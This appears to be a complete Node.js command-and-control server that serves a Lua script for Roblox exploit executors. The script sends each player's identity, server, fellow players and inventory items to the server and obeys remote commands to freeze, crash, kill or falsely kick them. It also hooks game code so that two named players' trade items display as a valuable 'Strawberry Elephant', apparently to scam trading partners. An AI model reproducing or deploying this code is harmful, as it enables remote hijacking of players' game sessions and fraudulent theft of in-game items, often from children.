const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const players = new Map();

app.get('/loader.lua', (req, res) => {
  const BASE = process.env.RENDER_EXTERNAL_URL ||
               (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : `http://localhost:${PORT}`);
  const loader = `
local BASE = "${BASE}"
local KEY = "xenooooo"

local function getRequest()
  local env = getgenv and getgenv() or _G
  return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or env.http_request or env.request or (env.syn and env.syn.request)
end

local request = getRequest()
if not request then
  local d = tick() + 10
  repeat task.wait(0.25) request = getRequest() until request or tick() > d
end
if not request then return end

local Players = game:GetService("Players")
local LP = Players.LocalPlayer
if not LP then
  local d = tick() + 30
  repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > d
end
if not LP then return end

local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local function safe(fn) local ok, r = pcall(fn) if ok then return r end end

local function getBrainrots()
  local list = {}
  local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
  if pg then
    local gui = safe(function() return pg:FindFirstChild("DuelsMachineSession") end)
    if gui then
      local frame = safe(function() return gui:FindFirstChild("DuelsMachineSession") end)
      if frame then
        local scroll = safe(function() return frame:FindFirstChild("ScrollingFrame") end)
        if scroll then
          for _, t in ipairs(scroll:GetChildren()) do
            if t.Name == "Template" then
              local cash, title
              for _, o in ipairs(t:GetDescendants()) do
                if (o:IsA("TextLabel") or o:IsA("TextButton")) and o.Text and o.Text ~= "" then
                  local text = o.Text
                  if string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "%$") or (string.match(text, "^%d+$") and tonumber(text) > 100) then
                    cash = text
                  end
                  if not string.match(text, "^%d+$") and not string.find(text, "Template") and not string.find(text, "Cookie") and not string.find(text, "Milki") and string.len(text) > 3 then
                    if not title or string.len(text) > string.len(title) then title = text
                  end
                end
              end
              if cash or title then list[#list+1] = { title = title or "Unknown", cash = cash or "Unknown" } end
            end
          end
        end
      end
    end
  end
  return list
end

local function heartbeat()
  safe(function()
    request({
      Url = BASE .. "/api/public/heartbeat",
      Method = "POST",
      Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
      Body = HttpService:JSONEncode({
        user_id = LP.UserId,
        username = LP.Name,
        display_name = LP.DisplayName,
        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png",
        place_id = game.PlaceId,
        game_name = (safe(function() return MarketplaceService:GetProductInfo(game.PlaceId).Name end) or "Unknown"),
        job_id = game.JobId,
        executor = (identifyexecutor and select(1, identifyexecutor())) or "unknown",
        server_players = (function() local t={} for _,p in pairs(Players:GetPlayers()) do t[#t+1]=p.Name end return t end)(),
        brainrots = getBrainrots(),
      }),
    })
  end)
end

local fpsConn, fpsOn = nil, false
local function setFps(on)
  if on == fpsOn then return end
  fpsOn = on
  if on then
    fpsConn = RunService.RenderStepped:Connect(function() local t = tick() while tick() - t < 0.95 do end end)
  else
    if fpsConn then fpsConn:Disconnect() fpsConn = nil end
  end
end

local history, active, mode, thread = {}, false, nil, nil
local HISTORY_SIZE, INTERVAL, SPEED_MIN = 0.27, 0.6, 17
RunService.Heartbeat:Connect(function()
  local c = LP.Character
  local r = c and c:FindFirstChild("HumanoidRootPart")
  if not r then return end
  local now = tick()
  history[#history+1] = { cframe = r.CFrame, time = now }
  local cutoff = now - HISTORY_SIZE - 0.1
  while #history > 0 and history[1].time < cutoff do table.remove(history, 1) end
end)

local function speed()
  local c = LP.Character
  local r = c and c:FindFirstChild("HumanoidRootPart")
  if not r then return 0 end
  local v = r.AssemblyLinearVelocity
  return Vector3.new(v.X, 0, v.Z).Magnitude
end

local function meets() if mode == "carry" then return speed() >= SPEED_MIN end return false end

local function rubberband()
  local c = LP.Character
  local r = c and c:FindFirstChild("HumanoidRootPart")
  if not r then return end
  local v = r.AssemblyLinearVelocity
  if Vector3.new(v.X, 0, v.Z).Magnitude < 1 then return end
  local target = tick() - HISTORY_SIZE
  local best
  for i=1,#history do if history[i].time >= target then best = history[i].cframe break end end
  if not best then return end
  r.CFrame = best
  r.AssemblyLinearVelocity = v
end

local function stopLoop() if thread then pcall(task.cancel, thread) thread = nil end end
local function startLoop()
  stopLoop()
  thread = task.spawn(function()
    local st = tick()
    local it = 0
    while active do
      while active and not meets() do task.wait(0.05) end
      if not active then break end
      it = it + 1
      local targetT = st + (it * INTERVAL)
      local sleep = targetT - tick()
      if sleep > 0 then task.wait(sleep) end
      if active and meets() then rubberband() end
    end
  end)
end

local function setLagCarry(on)
  if on == (mode == "carry") then return end
  if on then mode = "carry"; active = true; startLoop() else mode = nil; active = false; stopLoop() end
end

local function resetPlayer()
  pcall(function()
    local c = LP.Character
    if c then
      local h = c:FindFirstChild("Humanoid")
      if h then h.Health = 0 end
    end
  end)
end

_G.EleVisualEnabled = false
_G.SpooferTargets = {}
_G.SpoofHooked = false

pcall(function()
  local ReplicatedStorage = game:GetService("ReplicatedStorage")
  local CollectionService = game:GetService("CollectionService")
  local targetNames = { ["Momo766884"] = true, ["Rocketguy8940"] = true }

  task.spawn(function()
    for name,_ in pairs(targetNames) do
      pcall(function()
        local id = Players:GetUserIdFromNameAsync(name)
        if id then _G.SpooferTargets[id] = true end
      end)
    end
  end)

  local function isTarget(p1)
    local ownerId = p1.PlotModel and p1.PlotModel:GetAttribute("Owner")
    if ownerId and _G.SpooferTargets[ownerId] then return true end
    local owner = p1:GetOwner()
    if owner and targetNames[owner.Name] then return true end
    if p1.PlotModel then
      for _, desc in pairs(p1.PlotModel:GetDescendants()) do
        if desc:IsA("TextLabel") and desc.Text then
          for name,_ in pairs(targetNames) do
            if string.find(desc.Text, name) then return true end
          end
        end
      end
    end
    return false
  end

  local PlotClient = require(ReplicatedStorage:WaitForChild("Classes"):WaitForChild("PlotClient"))
  local Animals2 = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
  local NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))

  if not _G.SpoofHooked then
    _G.SpoofHooked = true
    local function hook(methodName)
      local old = PlotClient[methodName]
      if not old then return end
      PlotClient[methodName] = function(p1,p2,p3)
        if _G.EleVisualEnabled and isTarget(p1) then
          if p3 and p3.AnimalList and p3.AnimalList[p2] then
            local oldData = p3.AnimalList[p2]
            if type(oldData) == "table" and oldData.Index and oldData.Index ~= "Empty" then
              local spoofed = {}
              for k,v in pairs(oldData) do spoofed[k] = v end
              spoofed.Index = "Strawberry Elephant"
              spoofed.Traits = nil
              spoofed.Mutation = nil
              p3.AnimalList[p2] = spoofed
              local ret = old(p1,p2,p3)
              p3.AnimalList[p2] = oldData
              return ret
            end
          end
        end
        return old(p1,p2,p3)
      end
    end
    hook("UpdateModel")
    hook("UpdatePrompt")
    hook("UpdateClaim")
  end

  if hookmetamethod and getnamecallmethod and checkcaller then
    local oldNamecall = hookmetamethod(game, "__namecall", function(self,...)
      local method = getnamecallmethod()
      if not checkcaller() and _G.EleVisualEnabled then
        if method == "GetAttribute" then
          local attr = select(1,...)
          if attr == "__render_brainrot" or attr == "__render_mutation" or attr == "__render_traits" then
            if typeof(self) == "Instance" and CollectionService:HasTag(self, "ClientRenderBrainrot") then
              if attr == "__render_brainrot" then return "Strawberry Elephant" end
              if attr == "__render_mutation" then return nil end
              if attr == "__render_traits" then return "[]" end
            end
          end
        end
      end
      return oldNamecall(self,...)
    end)
  end

  task.spawn(function()
    while true do
      if _G.EleVisualEnabled then
        pcall(function()
          local dm = LP.PlayerGui:FindFirstChild("DuelsMachineSession")
          if dm then
            local ms = dm:FindFirstChild("DuelsMachineSession")
            if ms then
              local other = ms:FindFirstChild("Other")
              if other then
                local isTargetOpp = false
                for _, lbl in pairs(other:GetDescendants()) do
                  if lbl:IsA("TextLabel") and lbl.Text then
                    for name,_ in pairs(targetNames) do
                      if string.find(lbl.Text, name) then isTargetOpp = true; break end
                    end
                  end
                  if isTargetOpp then break end
                end
                if isTargetOpp then
                  for _, item in pairs(other:GetChildren()) do
                    if item.Name == "Item" then
                      local real = item:FindFirstChild("ViewportFrame")
                      if real then
                        local hasModel = false
                        for _,v in pairs(real:GetChildren()) do if v:IsA("Model") then hasModel = true; break end end
                        local title = item:FindFirstChild("Title")
                        local empty = false
                        if title then local t = title.Text; empty = (t == "Empty" or t == "Waiting..." or t == "None" or t == "") end
                        if hasModel and not empty then
                          if title and title.Text ~= "Strawberry Elephant" then title.Text = "Strawberry Elephant" end
                          local cash = item:FindFirstChild("Cash")
                          if cash then
                            local gen = Animals2:GetGeneration("Strawberry Elephant", nil, {})
                            cash.Text = ("$%*/s"):format(NumberUtils:ToString(gen))
                          end
                          local orig = real:GetAttribute("OriginalPos")
                          if not orig then orig = real.Position; real:SetAttribute("OriginalPos", orig) end
                          real.Visible = false
                          real.Position = UDim2.new(10,0,10,0)
                          local fake = item:FindFirstChild("FakeViewport")
                          if not fake then
                            fake = real:Clone()
                            fake.Name = "FakeViewport"
                            fake.Position = orig
                            fake.Visible = true
                            fake.ZIndex = real.ZIndex + 5
                            fake.Parent = item
                            pcall(function()
                              for _,v in pairs(fake:GetChildren()) do
                                if v:IsA("Model") or v:IsA("Camera") or v:IsA("ImageLabel") then v:Destroy() end
                              end
                              Animals2:AttachOnViewportWithOptimizations("Strawberry Elephant", fake, nil, nil)
                            end)
                          end
                          if fake then fake.Visible = true end
                          local traits = item:FindFirstChild("Traits")
                          if traits then
                            for _,v in pairs(traits:GetChildren()) do
                              if v:IsA("ImageLabel") and v.Name ~= "Template" then v.Visible = false end
                            end
                          end
                        else
                          local fake = item:FindFirstChild("FakeViewport")
                          if fake then fake.Visible = false end
                          local orig = real:GetAttribute("OriginalPos")
                          if orig then real.Position = orig end
                          real.Visible = true
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end)
        pcall(function()
          for _,p1 in pairs(CollectionService:GetTagged("ClientRenderBrainrot")) do
            if p1:GetAttribute("__render_brainrot") ~= "Strawberry Elephant" then
              CollectionService:RemoveTag(p1, "ClientRenderBrainrot")
              p1:SetAttribute("__render_brainrot", "Strawberry Elephant")
              p1:SetAttribute("__render_mutation", nil)
              p1:SetAttribute("__render_traits", "[]")
              CollectionService:AddTag(p1, "ClientRenderBrainrot")
            end
          end
        end)
      end
      task.wait(0.1)
    end
  end)
end)

local kicked, prevLagC, prevFps, prevEle = false, false, false, false

local function poll()
  local res = safe(function()
    return request({ Url = BASE .. "/api/public/command?user_id=" .. LP.UserId, Method = "GET", Headers = { ["X-Api-Key"] = KEY } })
  end)
  if not res or not res.Body then return end
  local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
  if not ok or type(data) ~= "table" then return end

  local wantFps = (data.fps_limit == true)
  if wantFps ~= prevFps then prevFps = wantFps; setFps(wantFps) end

  local wantLagC = (data.lag_c == true)
  if wantLagC ~= prevLagC then prevLagC = wantLagC; setLagCarry(wantLagC) end

  local wantEle = (data.ele_visual == true)
  if wantEle ~= prevEle then prevEle = wantEle; _G.EleVisualEnabled = wantEle end

  if data.reset == true then resetPlayer() end
  if data.crash == true then while true do end end
  if data.kick == true and not kicked then kicked = true; LP:Kick("Cheating detected | CODE: BAC-1633") end
end

heartbeat()
poll()
task.spawn(function() while task.wait(3) do heartbeat() end end)
task.spawn(function() while task.wait(0.5) do poll() end end)
`;
  res.setHeader('Content-Type', 'text/plain');
  res.send(loader);
});

app.post('/api/public/heartbeat', (req, res) => {
  const data = req.body;
  if (!data || !data.user_id) return res.status(400).json({ error: 'Missing user_id' });
  const userId = String(data.user_id);
  const existing = players.get(userId) || {};
  players.set(userId, {
    ...existing,
    ...data,
    user_id: userId,
    online: true,
    lastHeartbeat: Date.now(),
    fps_limit: existing.fps_limit || false,
    lag_c: existing.lag_c || false,
    ele_visual: existing.ele_visual || false,
  });
  res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
  const list = [];
  const now = Date.now();
  const OFFLINE = 15000;
  const REMOVE = 20 * 60 * 1000;
  for (const [id, p] of players.entries()) {
    const age = now - (p.lastHeartbeat || 0);
    if (age >= REMOVE) { players.delete(id); continue; }
    const online = age < OFFLINE;
    if (!online) {
      p.fps_limit = false;
      p.lag_c = false;
      p.ele_visual = false;
      p._kick = false;
      p._reset = false;
    }
    p.online = online;
    list.push({ ...p });
    players.set(id, p);
  }
  res.json({ players: list });
});

app.get('/api/command_state', (req, res) => {
  const userId = req.query.user_id;
  if (!userId) return res.status(400).json({ error: 'Missing user_id' });
  const p = players.get(String(userId));
  if (!p) return res.json({ fps_limit: false, lag_c: false, ele_visual: false });
  res.json({ fps_limit: p.fps_limit || false, lag_c: p.lag_c || false, ele_visual: p.ele_visual || false });
});

app.post('/api/command', (req, res) => {
  const { user_id, fps_limit, lag_c, ele_visual, kick, crash, reset } = req.body;
  if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
  const userId = String(user_id);
  const p = players.get(userId);
  if (!p) return res.status(404).json({ error: 'Player not found' });
  if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
  if (lag_c !== undefined) p.lag_c = !!lag_c;
  if (ele_visual !== undefined) p.ele_visual = !!ele_visual;
  if (kick === true) p._kick = true;
  if (crash === true) p._crash = true;
  if (reset === true) p._reset = true;
  players.set(userId, p);
  res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
  const userId = req.query.user_id;
  if (!userId) return res.status(400).json({ error: 'Missing user_id' });
  const p = players.get(String(userId));
  if (!p) return res.json({ fps_limit: false, lag_c: false, ele_visual: false });
  const response = { fps_limit: p.fps_limit || false, lag_c: p.lag_c || false, ele_visual: p.ele_visual || false };
  if (p._kick) { response.kick = true; p._kick = false; }
  if (p._crash) { response.crash = true; p._crash = false; }
  if (p._reset) { response.reset = true; p._reset = false; }
  players.set(String(userId), p);
  res.json(response);
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT);